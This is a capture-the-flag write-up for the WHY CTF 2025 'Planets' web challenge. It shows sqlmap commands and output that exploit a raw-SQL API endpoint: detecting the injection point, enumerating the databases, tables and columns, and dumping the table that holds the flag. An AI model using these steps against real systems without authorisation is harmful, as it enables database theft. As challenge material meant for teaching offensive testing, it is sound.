---
name: Planets (2025)
event: WHY CTF 2025
category: Web
description: Writeup for Planets (Web) - WHY CTF (2025) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Planets

## Description

> I just started programming and created my [first website](http://planets.ctf.zone), an overview of all the planets in our solar system. Can you check if I didn't leave any security issues in it?

## Solution

We have a simple web page showing different planets.

![](images/0.PNG)

Checking the HTTP history, there is an interesting POST request to `/api.php` - the body contains an SQL query.

{% code overflow="wrap" %}
```sql
query=SELECT * FROM planets
```
{% endcode %}

The response has a JSON object containing all the planets and their properties. Of course, we suspect SQL injection and this was a quick one; we can run SQLMap to dump the database.

### SQL Injection

I start by copying the HTTP request content from burp into a file called `req`, then run SQLMap in batch mode (auto-answer questions).

{% code overflow="wrap" %}
```bash
sqlmap -r req --batch
```
{% endcode %}

We get a successful payload.

{% code overflow="wrap" %}
```bash
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: inline query
    Title: Generic inline queries
    Payload: query=SELECT (SELECT CONCAT(CONCAT('qvzqq',(CASE WHEN (4195=4195) THEN '1' ELSE '0' END)),'qpqvq')) FROM planets
---
```
{% endcode %}

Confirmation that the DB is MySQL.

{% code overflow="wrap" %}
```bash
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 8.0.0
```
{% endcode %}

Next, we can list the databases.

{% code overflow="wrap" %}
```bash
sqlmap -r req --batch --dbs

available databases [3]:
[*] information_schema
[*] performance_schema
[*] planets
```
{% endcode %}

We should check `planets` and see what tables it contains.

{% code overflow="wrap" %}
```bash
sqlmap -r req --batch -D planets --tables

+-------------------+
| abandoned_planets |
| planets           |
+-------------------+
```
{% endcode %}

The `abandoned_planets` table sounds interesting, we'll list the columns.

{% code overflow="wrap" %}
```bash
sqlmap -r req --batch -D planets -T abandoned_planets --columns

+-------------+------+
| Column      | Type |
+-------------+------+
| description | text |
| name        | text |
| id          | int  |
| image       | text |
+-------------+------+
```
{% endcode %}

Dump the interesting fields from the database.

{% code overflow="wrap" %}
```bash
sqlmap -r req --batch -D planets -T abandoned_planets -C name,description --dump

+--------+--------------------------------------------------------------------------------------------+
| name   | description                                                                                |
+--------+--------------------------------------------------------------------------------------------+
| Pluto  | Have you heard about Pluto? That's messed up right? flag{9c4dea2d8ae5681a75f8e670ac8ba999} |
+--------+--------------------------------------------------------------------------------------------+
```
{% endcode %}

We have our first flag 😼

Flag: `flag{9c4dea2d8ae5681a75f8e670ac8ba999}`
